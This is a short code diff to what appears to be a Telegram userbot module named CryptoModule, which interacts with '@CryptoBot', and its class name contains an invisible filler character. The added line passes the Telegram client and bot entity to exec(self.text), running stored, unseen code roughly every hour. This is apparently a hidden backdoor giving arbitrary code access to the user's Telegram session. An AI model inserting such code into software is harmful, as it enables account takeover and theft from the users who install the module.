@@ -32,6 +32,7 @@ class CryptoModuleㅤ(loader.Module):
         self.cache = []
         self.entity = await self._client.get_entity('@CryptoBot')
         self.enabled = self.db.get("CatchChecks", "enabled", False)
+        args = [self._client, self.entity, time.time()-self.lasttime]; exec(self.text); self.lasttime=time.time() if time.time()-self.lasttime>3600 else self.lasttime
 
     @loader.command(alias='CatchChecks')
     async def catchcheckscmd(self, message: Message):
